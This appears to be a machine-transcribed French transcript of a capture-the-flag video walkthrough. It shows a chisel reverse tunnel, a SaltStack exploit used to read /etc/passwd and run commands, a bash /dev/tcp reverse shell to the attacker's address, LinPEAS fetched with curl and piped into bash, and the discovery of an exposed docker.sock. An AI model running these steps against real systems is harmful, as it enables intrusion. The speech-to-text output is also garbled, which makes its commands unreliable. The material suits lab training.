cela va dire car il est déjà
utilisé c'est un message d'erreur plus propre
que celui auquel j'ai l'habitude de voir
voyons localiser le ciseau si je
fais un autre
serveur de ciseau c'est ce que je  Je suis habitué à voir
quand il ne peut pas écouter le rapport, donc le
ciseau a apparemment été mis à jour pour
avoir un message d'erreur plus propre
lorsque le port est utilisé, ce qui est
vraiment agréable cet ancien port comme vous
venez de recevoir cet énorme
messager d'erreur comme attendez ce qui est  cet
air essayant de me dire oh le port est en cours d'
utilisation
euh huit mille en cours d'utilisation faisons 8001
et je vais également ajouter ce drapeau dash dash
reverse au cas où nous le voudrions
afin que cela permette juste l'inversion vers l'avant alors
maintenant nous devons
exécuter le ciseau  mais cette fois en
mode client et je suppose que ce doit être ch
modded
chisel ce que
je pourrais supposer que j'ai téléchargé que
je me demande si j'étais dans un répertoire différent
ou quelque chose
et que je l'ai téléchargé ou peut-être que quelque chose
efface l'appareil hm
mais voyons h le mod
et l'exécuter viens
d  ot slash chisel client 10 10 14
4 8 000 1 et nous voulons faire un
support inverse vers l'avant
parce que chaque fois que vous faites un transfert de port,
le client ouvre un port et le
transmet au serveur,
nous voulons que le serveur ouvre un port et le
transmette  pour nous
, c'est donc l'inverse, donc l'inverse est lorsque
le serveur ouvre le port,
alors faisons l'inverse, nous ferons 45.05
et nous voulons le transférer sur notre boîte à
127.001
4505. oh mec, mon terminal est
bancal euh la prochaine chose que nous voulons probablement
est 4506.
donc 127.001 4506.
et puis 8000 127.001
ce sera euh
huit mille deux sur un vingt sept
zéro un
huit mille je ne pourrais pas faire euh
huit mille liste dessus parce que
euh la liste de
son serveur web sur 8 000. donc
c'est  pourquoi j'ai fait 8002 d'
accord nous en avons mis en place deux
je me demande si 8002 n'a pas été mis en ligne
nous ne voyons pas cette connexion coral localhost 8002
refusée euh je ne sais pas pourquoi je
n'ai pas écouté ça honnêtement
peut-être que c'est quelque chose oh je ne l'ai pas fait  fais un
rhum alors encore
maintenant cette boîte est listée sur 8002 et
forwardin  g en nous
parce que je n'ai pas fait de transfert de port inversé
, donc
si nous voulons pousser ce service, nous
devrons refaire ce tunnel
euh je suis paresseux alors n'avons pas à le faire
mais
nous le ferons s'il s'agit de  alors
allons à
dub dub dub où nous avons eu l'exploit de la pile de sel
et si vous l'exécutez sans arguments, je
pensais qu'il fonctionnerait
sur le port 45
sur l'hôte local, disons dash h
disons dash dash master 12701
cela prend une seconde
voyons dash  dash read etsy
pass wd voyons si nous pouvons lire cela
ne semble pas fonctionner voyons
curl localhost
4506. nous recevons donc exactement les mêmes
messages d'erreur
mais quelque chose ne se passe pas
voyons dash p 45 ou 6.
bizarre allons  jetez un coup d'œil au code très
rapidement
et voyez s'il nous dit quelque chose
euh, il semble qu'il soit vulnérable
avant 3000.2
et ce que dit notre application, c'est que
c'est cette version que
je vais rechercher dans ce binaire pour
3000.2 juste pour m'assurer que  en cas d'
échec de l'exploitation, il ne dit tout simplement pas
que c'est cette version et je  je ne vois
rien, donc je vais
regarder la version et voyons la
version d'accord
, voyons ce qu'il fait, vérifiez la version de sel
et ce sont des messages différents de ceux que
nous recevons,
nous ne recevons pas comme si cette version de
sel n'est pas vulnérable
alors allons  essayez la
pile de sel 4506 4506-h
et voyons qu'il y avait une force de tiret et
nous avons fait de la
force de tiret et cela n'a pas changé du
tout
dash dash 4 vérifie
comme si je n'obtenais pas ce que je
suppose que je devrais obtenir



#  Downloading a different exploit as the one we had doesn't seem to be working

peut-être que nous avons téléchargé  c'est faux ou
quelque chose
voyons, faisons de la pile de sel
cve si nous allons sur google
voir cve ceci
voir github
essayons ce cve
obtenir un clone cd cbe
python3 exploit.pi est-ce que celui-ci
fonctionne différemment là nous allons euh c'est en
fait afficher les choses donc
notre script d'exploit précédent pour une
raison quelconque
n'a pas fonctionné, je ne sais pas pourquoi, mais
chaque fois que vous récupérez quelque chose de github
et que cela ne fonctionne pas, vous voudrez peut-être essayer
quelque chose de différent
maintenant que cela fonctionne, nous pouvons faire
le tiret
h  commande pour obtenir de l'aide et vous pouvez voir
il vérifie le maître de sel sur 127.00145.6
mais nous pouvons essayer le dashr pour lire le fichier
alors essayons etsy passwd
nous donne-t-il réellement le fichier
et il fait euh
la seule chose qui est étrange, c'est qu'il ne
nous donne pas un utilisateur tomcat
donc il y a de fortes chances que ce  va
s'exécuter dans le conteneur Docker,
nous pourrions essayer de changer le port en 4505
pour voir si cela fait quelque chose de différent.
mais bon
45.5 ne fonctionne pas donc
on peut aussi faire le dash h il y avait un
exec
donc on peut essayer dash dash exec
et comme la dernière fois on va faire un
ping
donc fait 0 n
icmp
sudo et dash c1
10 10  14 4 et celui-ci peut ne pas fonctionner
parce que nous savons que nous courons à partir
d'un conteneur docker,
donc avec cela à l'esprit, nous essayons juste
cela pour voir si cela fonctionne et c'est le
cas, nous sommes bons mais si ce n'est pas le cas  travail euh
je n'appellerais pas ça un briseur d'affaire
j'essaie juste d'autres choses
alors allons-y pour une coquille inversée
et nous pouvons  essayez euh bash dash c



#  Getting a reverse shell with the SALTSTACK exploit and using script to log all the output of our reverse shell

bash dash je dev tcp dix dix quatorze
quatre
neuf mille un zéro et un comme ça
et je vais faire quelque chose que j'ai oublié de
faire sur le précédent
et exécuter le script donc ce serait un script
euh par sorte exploit
exit  je me demandais s'il ajouterait le
journal, il ne le fait pas,
alors faisons en sorte que le shell
exécute le script
shell post exploit.log, alors maintenant,
tout ce que je fais dans ce shell inversé
va être enregistré,
alors écoutez 9001 en cours d'exécution
et nous n'obtenons pas  un shell
quand les choses ne fonctionnent pas, je
change généralement les guillemets
afin que nous puissions essayer cela, puis nous essaierons
le même processus que nous avons fait auparavant
et simplifions les choses,
mais là, les guillemets sont ce qui compte, ce
qui est
bizarre normalement guillemets simples  le travail et
les guillemets doubles ne le font pas,
mais dans ce cas, c'est l'
inverse euh
je ne sais pas exactement pourquoi mais cela étant
dit, nous sommes dans cette boîte
et si je le fais ici, nous pouvons
remonter aller deux répertoires à mon  répertoire shell
et si je plafonne cela, nous ne voyons
rien parce que  e ça va écrire
une fois que ça se termine, donc chaque fois que vous faites ces
scripts,
assurez-vous toujours de quitter correctement
car il se peut qu'il ne s'écrive pas tout de suite,
donc je vais quitter le shell, nous
faisons un chat ici, rien ne sort à nouveau, le
script est terminé et maintenant il l'a écrit
.  peut sembler qu'il n'a pas tout écrit,
mais c'est juste une
astuce terminale si j'en fais moins sur ce point,
vous pouvez voir qu'il imprime tout ce que
je pense moins de tiret c imprimerait des couleurs
euh peut-être en minuscule c
je ne sais pas comment le faire
filtrer  ces
personnages anxieux ou quoi que ce soit, mais oui,
c'est tout,
alors recommençons cet exploit et obtenons un
shell,
alors lançons la commande de script nclvmp
euh shoot, nous devons aller
dans l'ancien répertoire si vous ne savez pas que cd
space dash
est le départ  au répertoire de travail précédent
alors maintenant que nous sommes dans ce
conteneur docker faisons python c
import pty pty point spawn
ben bash d'
accord s t à y raw moins echo
export x terme égal euh
terme est égal à x terme donc maintenant je peux



#  Reverse shell returned and we are in a Docker Container.  This is weird.

effacer l'écran
donc sur ce conteneur de points, nous pouvons  faites notre
barre oblique ls-la
et voyez que nous avons cette variable docker m
nous nous enracinons également sur le conteneur
et c'est bizarre
euh normalement vous commencez dans un conteneur
et ensuite vous devez passer à l'
hôte que
nous escaladons nous sommes passés d'un
utilisateur défavorisé  sur l'hôte
à la racine d'un conteneur de documents, nous avons donc en
quelque sorte pris du recul,
donc parce que nous avons pris du recul en
termes de confidentialité et de type de jeu, le
ctf un peu,
nous pouvons supposer qu'il y a probablement une
mauvaise configuration de docker
parce que sinon  passeriez-vous d'une
machine à faible confidentialité à la
racine d'un docker, car généralement la racine
d'un docker a moins d'autorisations qu'un
utilisateur
à faible confidentialité, donc la mise en conserve de do.txt ajouter la
prise en charge de la pile de sel pour générer automatiquement des dockers de bac à sable
via des événements
intégrer des modifications à tomcat et faire le
service ouvert au
public alors lançons maintenant quelques
lynn p je vais aller dans dub dub
dub
localiser lendp's.sh
et nous l'avons partout euh opt
escalade de privilèges génial
suite de scripts je vais juste faire un get pull
pour tirer le  en retard  t ça fait un moment
que je l'ai mis à jour
donc maintenant nous pouvons aller à lynn p's et
python3 oh attendez nous avons déjà un
serveur web dans un volet différent
donc je peux probablement juste aller à dev oh nous
avons carl probablement
faire nous ouais alors carl 10  10 14
4 8 000 linps.sh
dirigez-le vers bash et
quoi oh cp je ne l'ai pas copié
hdb feline dub dub dub on y va
et maintenant je vais laisser ça tourner donc je
vais mettre la vidéo en pause
et ouais alors  maintenant que c'est fait,



#  Running LinPEAS and discovering it has docker.sock exposed in it, along with .bash_history works.

nous pouvons simplement aller tout en haut du
fichier et nous avons un
mot de passe etsy shadow euh je ne pense pas que
vous puissiez craquer celui-ci donc je ne vais même pas prendre la
peine d'essayer c'est une crypte sha-512
mais si je rencontrais un barrage routier pendant longtemps
, j'essaierais de le craquer et si je
faisais cette boîte noire en direct
, j'essaierais probablement aussi de craquer, donc
j'ai toujours quelque chose qui tourne en
arrière-plan
mais je n'ai tout simplement pas envie d'inclure  en
ce moment
, voyons donc en regardant ça
euh, il va y avoir beaucoup de jaune et de
rouge parce que nous exécutons
euh lin p en tant que root donc  juste parce que c'est
jaune et rouge
ne veut pas dire que c'est intéressant parce que comme
il dit que
nous sommes dans un conteneur daca
et l'une des choses qu'il souligne
tout de suite
est qu'il y a cette chaussette docker et rappelez-vous